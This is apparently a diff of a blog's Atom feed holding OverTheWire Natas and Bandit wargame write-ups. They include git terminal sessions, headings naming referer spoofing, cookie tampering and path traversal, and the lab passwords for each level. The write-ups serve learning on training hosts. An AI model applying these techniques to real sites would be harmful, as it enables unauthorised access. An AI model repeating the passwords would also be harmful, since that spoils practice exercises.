+&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;a-wamp-install-and-php-script-later&quot;&gt;A WAMP install and PHP script later..&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/27.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/30.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;VICTORY.&lt;/p&gt;
 
-&lt;p&gt;gtVrDuiDfck831PqWsLEZy5gyDz1clto&lt;/p&gt;
-
-&lt;h1 id=&quot;level-1&quot;&gt;Level 1&lt;/h1&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas1
-URL:      http://natas1.natas.labs.overthewire.org
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;as-last-time-developer-tools&quot;&gt;As last time, developer tools&lt;/h2&gt;
-
-&lt;p&gt;VICTORY.&lt;/p&gt;
-
-&lt;p&gt;ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi&lt;/p&gt;
-
-&lt;h1 id=&quot;level-2&quot;&gt;Level 2&lt;/h1&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas2
-URL:      http://natas2.natas.labs.overthewire.org
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;dev-tools-again&quot;&gt;Dev tools again.&lt;/h2&gt;
-
-&lt;h2 id=&quot;files-those-sound-good&quot;&gt;Files? Those sound good.&lt;/h2&gt;
-
-&lt;h2 id=&quot;users-sound-even-better&quot;&gt;Users sound even better.&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14&lt;/p&gt;
-
-&lt;h1 id=&quot;level-3&quot;&gt;Level 3&lt;/h1&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas3
-URL:      http://natas3.natas.labs.overthewire.org
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;you-can-assume-ive-looked-at-the-webpage-straight-to-dev-tools&quot;&gt;You can assume I’ve looked at the webpage.. Straight to dev tools&lt;/h2&gt;
-
-&lt;h2 id=&quot;ah-robots-my-old-wordpress-enemy&quot;&gt;Ah robots, my old WordPress enemy.&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;level-4&quot;&gt;Level 4&lt;/h1&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas4
-URL:      http://natas4.natas.labs.overthewire.org
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;lets-send-that-to-the-repeater-and-look-at-what-we-send&quot;&gt;Lets send that to the repeater and look at what we send&lt;/h2&gt;
-
-&lt;h2 id=&quot;lets-add-some-referers&quot;&gt;Lets add some referers..&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq&lt;/p&gt;
-
-&lt;h1 id=&quot;level-5&quot;&gt;Level 5&lt;/h1&gt;
-
-&lt;h2 id=&quot;not-logged-in-well-the-answer-is-yummy-sent-the-request-to-burps-repeater&quot;&gt;Not logged in? Well, the answer is yummy. Sent the request to Burp’s repeater..&lt;/h2&gt;
-
-&lt;h2 id=&quot;whats-this-logged-in-boolean-lets-change-and-send&quot;&gt;What’s this? Logged in boolean? Lets change and send.&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&lt;/p&gt;
-
-&lt;h1 id=&quot;level-6&quot;&gt;Level 6&lt;/h1&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9&lt;/p&gt;
-
-&lt;h1 id=&quot;level-7&quot;&gt;Level 7&lt;/h1&gt;
-
-&lt;h2 id=&quot;traversal-for-the-win-i-remember-things&quot;&gt;Traversal for the win! I remember things!&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Natas - What is it? ``` Natas</summary></entry><entry><title type="html">Overthewire Natas Passwords</title><link href="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Passwords.html" rel="alternate" type="text/html" title="Overthewire Natas Passwords" /><published>2021-04-10T10:00:00+01:00</published><updated>2021-04-10T10:00:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Passwords</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/10/OverTheWire-Natas-Passwords.html">&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Level 1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
-Level 2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 
-Level 3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
-Level 4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
-Level 5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
-Level 6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
-Level 7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
-Level 8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 1: gtVrDuiDfck831PqWsLEZy5gyDz1clto Level 2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi Level 3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 Level 4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ Level 5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq Level 6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 Level 7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 Level 8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</summary></entry><entry><title type="html">Overthewire Bandit Level 32 To 33 (the end)</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-32-to-33-(The-End).html" rel="alternate" type="text/html" title="Overthewire Bandit Level 32 To 33 (the end)" /><published>2021-04-09T11:26:00+01:00</published><updated>2021-04-09T11:26:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-32-to-33-(The%20End)</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-32-to-33-(The-End).html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;After all this &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;git&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; stuff its &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;another escape. Good luck!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;yeah-no-you-can-figure-out-how-to-do-this-one&quot;&gt;Yeah no, you can figure out how to do this one..&lt;/h2&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;Password: c9c3199ddf4121b10cf581a98d51caee&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal After all this `git` stuff its time for another escape. Good luck!</summary></entry><entry><title type="html">Overthewire Bandit Level 31 To 32</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-31-to-32.html" rel="alternate" type="text/html" title="Overthewire Bandit Level 31 To 32" /><published>2021-04-09T11:25:00+01:00</published><updated>2021-04-09T11:25:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-31-to-32</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-31-to-32.html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is a git repository at &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh://bandit31-git@localhost/home/bandit31-git/repo&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit31-git&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; is the same as &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit31&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-Clone the repository and find the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the next level.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;another-another-git-one-same-process-temp-dir-clone-inspect&quot;&gt;Another… Another git one.. Same process… temp dir, clone, inspect.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit31@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/zd31
-bandit31@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd31
-bandit31@bandit:/tmp/zd31&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
-Cloning into &lt;span class=&quot;s1&quot;&gt;&apos;repo&apos;&lt;/span&gt;...
-Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/home/bandit31/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;localhost (127.0.0.1)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
-Are you sure you want to continue connecting (yes/no)? yes
-Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
-This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
-
-bandit31-git@localhost&apos;&lt;/span&gt;s password:
-remote: Counting objects: 4, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3/3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4/4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-bandit31@bandit:/tmp/zd31&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;repo
-bandit31@bandit:/tmp/zd31&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;repo/
-bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;README.md
-bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;README.md
-This &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;your task is to push a file to the remote repository.
-
-Details:
-    File name: key.txt
-    Content: &lt;span class=&quot;s1&quot;&gt;&apos;May I come in?&apos;&lt;/span&gt;
-    Branch: master
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;so-i-pushed-the-txt-file-and-guess-what-nothing-happened-i-wonder&quot;&gt;So.. I pushed the .txt file and guess what? Nothing happened. I wonder..&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  ..  .git  .gitignore  key.txt  README.md
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;sneaky-removed-the-txt-from-gitignore&quot;&gt;Sneaky. Removed the txt from gitignore.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  ..  .git  .gitignore  key.txt  README.md
-bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sneaky&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;master b792eac] Sneaky
- 2 files changed, 2 insertions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 deletion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- create mode 100644 key.txt
-bandit31@bandit:/tmp/zd31/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push
-Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/home/bandit31/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;localhost (127.0.0.1)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
-Are you sure you want to continue connecting (yes/no)? yes
-Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
-This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
-
-bandit31-git@localhost&apos;&lt;/span&gt;s password:
-Counting objects: 4, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Delta compression using up to 2 threads.
-Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2/2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Writing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4/4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 330 bytes | 0 bytes/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Total 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-remote: &lt;span class=&quot;c&quot;&gt;### Attempting to validate files... ####&lt;/span&gt;
-remote:
-remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
-remote:
-remote: Well &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; Here is the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the next level:
-remote: 56a9bf19c63d650ce78e6ec0354ee45e
-remote:
-remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
-remote:
-To ssh://localhost/home/bandit31-git/repo
- &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;remote rejected] master -&amp;gt; master &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pre-receive hook declined&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-error: failed to push some refs to &lt;span class=&quot;s1&quot;&gt;&apos;ssh://bandit31-git@localhost/home/bandit31-git/repo&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;VICTORY and hey, didn’t even have to google a thing on this one. Heh.&lt;/p&gt;
-
-&lt;p&gt;Password is: 56a9bf19c63d650ce78e6ec0354ee45e&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal ```bash There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.</summary></entry><entry><title type="html">Overthewire Bandit Level 30 To 31</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-30-to-31.html" rel="alternate" type="text/html" title="Overthewire Bandit Level 30 To 31" /><published>2021-04-09T11:24:00+01:00</published><updated>2021-04-09T11:24:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-30-to-31</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-30-to-31.html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is a git repository at &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh://bandit30-git@localhost/home/bandit30-git/repo&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit30-git&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; is the same as &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit30&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-Clone the repository and find the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the next level.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;another-git-one-same-process-temp-dir-clone-inspect&quot;&gt;Another git one.. Same process… temp dir, clone, inspect.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit30@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/zd30
-bandit30@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd30
-bandit30@bandit:/tmp/zd30&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
-Cloning into &lt;span class=&quot;s1&quot;&gt;&apos;repo&apos;&lt;/span&gt;...
-Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/home/bandit30/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;localhost (127.0.0.1)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
-Are you sure you want to continue connecting (yes/no)? yes
-Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).
-This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
-
-bandit30-git@localhost&apos;&lt;/span&gt;s password:
-remote: Counting objects: 4, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4/4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 297 bytes | 0 bytes/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-bandit30@bandit:/tmp/zd30&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;repo
-bandit30@bandit:/tmp/zd30&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;repo/
-bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;README.md
-bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;README.md
-just an epmty file... muahaha
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;awh-thats-mean-will-look-at-branches-history-etc-now&quot;&gt;Awh, that’s mean. Will look at branches, history etc now.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
-  origin/HEAD -&amp;gt; origin/master
-  origin/master
-bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-commit 3aefa229469b7ba1cc08203e5d8fa299354c496b
-Author: Ben Dover &amp;lt;noone@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:54 2020 +0200
-
-    initial commit of README.md
-
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/README.md b/README.md
-new file mode 100644
-index 0000000..029ba42
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; /dev/null
-+++ b/README.md
-@@ &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt;,0 +1 @@
-+just an epmty file... muahaha
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;the-branches-were-no-use-what-else-can-we-try-tags&quot;&gt;The branches were no use.. What else can we try. Tags?&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag
-secret
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;okay-whats-inside-secret&quot;&gt;Okay, what’s inside secret?&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit30@bandit:/tmp/zd30/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git show secret
-47e603bb428404d265f59c42920d81e5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;Password is: 47e603bb428404d265f59c42920d81e5&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal ```bash There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.</summary></entry><entry><title type="html">Overthewire Bandit Level 29 To 30</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-29-to-30.html" rel="alternate" type="text/html" title="Overthewire Bandit Level 29 To 30" /><published>2021-04-09T11:23:00+01:00</published><updated>2021-04-09T11:23:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-29-to-30</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-29-to-30.html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
